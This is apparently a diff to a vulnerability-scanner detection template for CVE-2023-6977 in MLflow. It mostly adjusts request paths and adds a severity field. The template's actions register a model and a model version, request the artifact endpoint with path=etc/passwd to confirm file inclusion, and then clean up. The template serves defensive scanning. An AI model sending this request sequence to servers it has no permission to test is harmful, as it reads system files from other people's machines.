@@ -17,6 +17,7 @@ finding: {
     publisher: "GOOGLE"
     value: "MLFLOW_LFI_RFI"
   }
+  severity: HIGH
   title: "CVE-2023-6977 MLflow LFI/RFI"
   description:
     "mlflow is a platform to streamline machine learning development, including tracking"
@@ -36,20 +37,15 @@ finding: {
   }
 }
 
-config: {
-  debug: true
-}
-
 ###########
 # ACTIONS #
 ###########
 
 actions: {
   name: "create_model"
-  cleanup_actions: ["clean_model"]
   http_request: {
     method: POST
-    uri: "ajax-api/2.0/mlflow/registered-models/create"
+    uri: "/ajax-api/2.0/mlflow/registered-models/create"
     headers: [
       { name: "Content-Type" value: "application/json" }
     ]
@@ -63,13 +59,14 @@ actions: {
       }
     }
   }
+  cleanup_actions: "clean_model"
 }
 
 actions: {
   name: "update_model"
   http_request: {
     method: POST
-    uri: "ajax-api/2.0/mlflow/model-versions/create"
+    uri: "/ajax-api/2.0/mlflow/model-versions/create"
     headers: [
       { name: "Content-Type" value: "application/json" }
     ]
@@ -89,7 +86,7 @@ actions: {
   name: "read_file"
   http_request: {
     method: GET
-    uri: "model-versions/get-artifact?path=etc/passwd&name={{ model_name }}&version=1"
+    uri: "/model-versions/get-artifact?path=etc/passwd&name={{ model_name }}&version=1"
     response: {
       http_status: 200
       expect_all: {
@@ -105,7 +102,7 @@ actions: {
   name: "clean_model"
   http_request: {
     method: DELETE
-    uri: "ajax-api/2.0/mlflow/registered-models/delete"
+    uri: "/ajax-api/2.0/mlflow/registered-models/delete"
     headers: [
       { name: "Content-Type" value: "application/json" }
     ]
